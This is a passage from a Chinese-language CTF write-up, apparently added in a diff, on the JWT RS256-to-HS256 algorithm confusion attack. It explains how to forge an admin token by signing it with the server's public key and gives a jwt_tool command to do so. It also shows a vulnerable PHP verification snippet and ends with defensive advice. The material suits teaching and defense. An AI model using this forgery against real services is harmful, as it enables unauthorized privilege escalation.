+*   **原理 (Principle):** 这是一个经典的 JWT 漏洞。服务器端代码在验证 Token 时，可能设计为同时支持非对称算法（如 `RS256`，使用公钥验证）和对称算法（如 `HS256`，使用密钥验证）。如果服务器获取验证密钥的逻辑不严谨，例如直接信任 Header 中的 `alg` 字段来决定使用哪个密钥以及如何验证，就会出现问题。攻击者可以：
+    1.  获取服务器用于验证 `RS256` 签名的公钥（公钥通常是公开的或容易获取）。
+    2.  修改 JWT Header，将 `alg` 字段从 `RS256` 改为 `HS256`。
+    3.  修改 Payload 以获得更高权限（例如 `role: admin`）。
+    4.  使用 **获取到的公钥** 作为 **HS256 算法的密钥**，对修改后的 `encodedHeader.encodedPayload` 进行签名。
+    5.  将伪造的 Token 发送给服务器。
+    6.  服务器看到 `alg` 是 `HS256`，错误地使用**公钥**作为 HS256 的密钥来验证签名。由于签名是用同一个“密钥”（即公钥）生成的，验证会通过。
+*   **利用条件 (Exploitation Conditions):**
+    *   服务器端 JWT 验证逻辑同时接受多种算法（特别是 RS256 和 HS256）。
+    *   服务器端根据 Header 中的 `alg` 字段来选择验证密钥和方法。
+    *   攻击者能够获取到服务器用于验证 RS256 签名的公钥。
+*   **利用 (Exploitation):**
+    1.  获取原始 Token (通常是 RS256 签名) 和服务器的公钥 (`publickey.pem`)。
+    2.  使用工具 (如 `jwt_tool`) 或脚本，构造新的 Token:
+        *   Header: `{ "alg": "HS256", "typ": "JWT" }`
+        *   Payload: `{ ..., "role": "admin", ... }` (修改需要的部分)
+        *   Signature: 使用 HS256 算法，以**公钥文件的内容**作为密钥，对 `base64url(header) + "." + base64url(payload)` 进行签名。
+    3.  **命令示例 (jwt_tool):**
+        ```bash
+        # -I: Input token (optional, helps copy structure)
+        # -hc: Modify header claim (alg to HS256)
+        # -pc: Modify payload claim (e.g., role to admin)
+        # -S: Sign using specified algorithm (hs256)
+        # -k: Key file (provide the public key here!)
+        python jwt_tool.py <original_token> -I -hc alg HS256 -pc role admin -S hs256 -k publickey.pem 
+        ```
+    4.  将生成的伪造 Token 发送给服务器。
+*   **示例 (CTFHUB Example):**
+    *   **源码分析:**
+        ```php
+        // ...
+        $PUBLIC_KEY = file_get_contents("./publickey.pem");
+        // ...
+        $header = JWTHelper::getHeader($token);
+        // !! Vulnerable part: merges header's alg with default alg !!
+        $algs = array_merge(array($header->alg), array('RS256')); // Could accept HS256 if header->alg is HS256
+        // !! Uses the same $PUBLIC_KEY regardless of the algorithm chosen !!
+        return JWT::decode($token, $PUBLIC_KEY, $algs); 
+        // ...
+        ```
+        代码显示 `decode` 函数接受头部指定的算法，并且总是使用 `$PUBLIC_KEY` 来验证，这正是漏洞所在。
+    ![修改签名算法 1](/ctfhub/images/jwt10.png)
+    (使用 `jwt_tool`，将算法改为 `HS256`，修改 payload，并使用 `publickey.pem` 作为 HS256 的密钥进行签名)
+    ![修改签名算法 2](/ctfhub/images/jwt11.png)
+    (重放伪造的 Token 获得 Flag)
+
+## 注意事项 (Considerations)
+
+*   **密钥管理:** 对于 HS256 等对称算法，密钥的保密至关重要，且应足够复杂。对于 RS256 等非对称算法，私钥必须保密。
+*   **算法验证:** 服务器端**必须**严格校验 `alg` 头部字段，只接受预期的算法，并且根据算法类型使用正确的密钥（私钥签名，公钥验签；共享密钥签验）。**绝不能**直接信任客户端提供的 `alg` 来选择密钥或验证方法。
+*   **Payload 内容:** 不要在 Payload 中存储敏感信息。如果需要传输敏感数据，应考虑使用 JWE (JSON Web Encryption) 对 Payload 进行加密。
+*   **过期时间 (`exp`):** 务必设置合理的过期时间，并严格验证。
+*   **重放攻击:** 考虑使用 `jti` (JWT ID) 声明并配合服务器端存储已使用的 JTI 来防止重放攻击。
+*   **工具:** `jwt.io` (在线调试), `jwt_tool` (命令行), `Burp Suite` 的 `JSON Web Tokens` 插件等都是分析和利用 JWT 的常用工具。
